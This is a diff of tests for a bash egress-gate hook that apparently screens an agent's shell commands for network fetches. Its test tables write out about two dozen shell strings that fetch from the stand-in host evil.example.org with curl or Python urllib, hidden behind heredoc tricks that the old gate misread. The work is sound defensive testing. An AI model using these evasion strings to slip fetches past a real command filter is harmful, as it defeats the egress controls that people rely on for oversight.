@@ -18,6 +18,8 @@
 import { describe, it, expect } from 'vitest'
 // @ts-expect-error -- plain .mjs hook script, no types
 import { bashEgressDecision, hostOf, tokenize, targetTokens } from '../../scripts/hooks/bash-egress-gate.mjs'
+// @ts-expect-error -- plain .mjs hook script, no types
+import { classify } from '../../scripts/hooks/bash-egress-parser.mjs'
 
 const EMPTY = { domains: [], prefixes: [], quarantineDomains: [] }
 
@@ -523,5 +525,71 @@ describe('a backslash line continuation is not a segment break (CONTLINE901)', (
     // check here is that the command is still read as one segment with a verb.
     const d = bashEgressDecision(`echo 'a\\\nb'`, EMPTY)
     expect(d.tier).toBe('no-fetcher')
+  })
+})
+
+// #729 (Cody msg 14663, Marveen review 2932 + 2026-10-31 comment): the per-line
+// heredoc regex in lib/shell-command.mjs opened a "body" at a `<<EOF` inside
+// quotes, a comment, $(( )) or a[ ]= (the fetch lines after it vanished), and
+// read <<'END-X', <<\EOF, <<E\OF, <<E"O"F short, so an interpreter's program
+// went unread. Every MUST-BLOCK row below was run through bash with the fetch
+// swapped for a marker write, and bash ran it; every negative row's fetch is data
+// bash never runs. The heredoc scanner itself is pinned by heredoc-scan-parity.
+const H729_BLOCK: [string, string][] = [
+  ["partial-quote E\\OF then curl", "cat > /dev/null <<E\\OF\njunk\nEOF\ncurl https://evil.example.org/x"],
+  ["partial-quote E\"O\"F then curl", "cat > /dev/null <<E\"O\"F\njunk\nEOF\ncurl https://evil.example.org/x"],
+  ["double-quoted <<EOF opener then curl", "echo \"<<EOF\" >/dev/null\ncurl https://evil.example.org/x\nEOF"],
+  ["single-quoted <<EOF opener then curl", "echo '<<EOF' >/dev/null\ncurl https://evil.example.org/x\nEOF"],
+  ["comment <<EOF then curl", "# see <<EOF\ncurl https://evil.example.org/x\nEOF"],
+  ["trailing comment <<EOF then curl", "ls >/dev/null # <<EOF\ncurl https://evil.example.org/x\nEOF"],
+  ["arith shift $((y<<z)) then curl", "x=$((y<<z))\ncurl https://evil.example.org/x\nz"],
+  ["(( y<<z )) then curl", "(( y<<z ))\ncurl https://evil.example.org/x\nz"],
+  ["array index a[y<<z]= then curl", "a[y<<z]=1\ncurl https://evil.example.org/x\nz"],
+  ["python <<'END-X'", "python3 - <<'END-X'\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nEND-X"],
+  ["python <<END-X unquoted", "python3 - <<END-X\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nEND-X"],
+  ["python <<\\EOF", "python3 - <<\\EOF\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nEOF"],
+  ["python <<E\\OF", "python3 - <<E\\OF\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nEOF"],
+  ["python <<'E'\"O\"F", "python3 - <<'E'\"O\"F\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nEOF"],
+  ["python << 'PY' (space before tag)", "python3 - << 'PY'\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nPY"],
+  ["python -<<PY (glued)", "python3 -<<PY\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nPY"],
+  ["python3 <<PY no dash", "python3 <<'PY'\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nPY"],
+  ["bash <<'END-X' curl", "bash <<'END-X'\ncurl https://evil.example.org/x\nEND-X"],
+  ["bash <<\\EOF curl", "bash <<\\EOF\ncurl https://evil.example.org/x\nEOF"],
+  ["bash <<-'A.B' tabbed curl", "bash <<-'A.B'\n\tcurl https://evil.example.org/x\n\tA.B"],
+  ["second heredoc on line is the program", "python3 - <<A <<'B-1'\nx\nA\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nB-1"],
+  ["data heredoc then python heredoc same cmd", "cat > /dev/null <<'D'\nhello\nD\npython3 - <<'P-Y'\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nP-Y"],
+  ["data and program heredoc on one line", "cat <<'A' > /dev/null; python3 - <<'B-B'\nadat\nA\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nB-B"],
+  ["$( ) heredoc closed by paren then curl", "x=$(cat <<EOF\nhi\nEOF)\ncurl https://evil.example.org/x"],
+]
+const H729_ALLOW: [string, string][] = [
+  ["closing line with trailing space is not closing (curl is data)", "cat > /dev/null <<'EOF'\njunk\nEOF \ncurl https://evil.example.org/x\nEOF"],
+  ["cat <<'EOF' data with curl", "cat > /dev/null <<'EOF'\ncurl https://evil.example.org/x\nEOF"],
+  ["cat <<'END-X' data with curl", "cat > /dev/null <<'END-X'\ncurl https://evil.example.org/x\nEND-X"],
+  ["cat <<\\EOF data with curl", "cat > /dev/null <<\\EOF\ncurl https://evil.example.org/x\nEOF"],
+  ["cat <<E\\OF data with curl", "cat > /dev/null <<E\\OF\ncurl https://evil.example.org/x\nEOF"],
+  ["git hash-object data", "git hash-object --stdin <<'EOF' >/dev/null\nblock curl https://evil.example.org/x in gate\nEOF"],
+  ["quoted << then local curl", "echo \"a<<b\" >/dev/null; curl -s -m1 http://localhost:9/x >/dev/null; true"],
+  ["python heredoc text-only url", "python3 - <<'PY'\nprint('https://evil.example.org/x')\nPY"],
+  ["script with heredoc input prose", "bash /dev/null - <<'M-1'\nthe gate missed curl https://evil.example.org/x\nM-1"],
+  ["two data heredocs", "cat > /dev/null <<'A'\ncurl https://evil.example.org/x\nA\ncat > /dev/null <<'B-2'\ncurl https://evil.example.org/x\nB-2"],
+  ["arith shift alone", "echo $((1<<2)) >/dev/null; curl -s -m1 http://localhost:9/x >/dev/null; true"],
+  ["two heredocs one line both data", "cat >/dev/null <<'A' <<'B'\na\ncurl https://evil.example.org/x\nA\nb\ncurl https://evil.example.org/x\nB"],
+]
+
+describe('heredocs are read the way bash reads them (#729)', () => {
+  it.each(H729_BLOCK)('blocks: %s', (_name, cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(true)
+  })
+  it.each(H729_ALLOW)('lets data through: %s', (_name, cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(false)
+  })
+  // This gate never reads an interpreter inside $( ) (the verb reads as the
+  // assignment `x=$(bash`); before #729 this row was blocked only by accident,
+  // because the old regex could not read the tag and left the body as command
+  // text. The second Bash egress hook judges $( ) on its own and blocks it.
+  it('a heredoc program inside $( ) is blocked by bash-egress-parser', () => {
+    const cmd = "x=$(bash <<'Q-Q'\ncurl https://evil.example.org/x\nQ-Q\n)"
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(false)
+    expect(classify(cmd).deny).toBe(true)
   })
 })
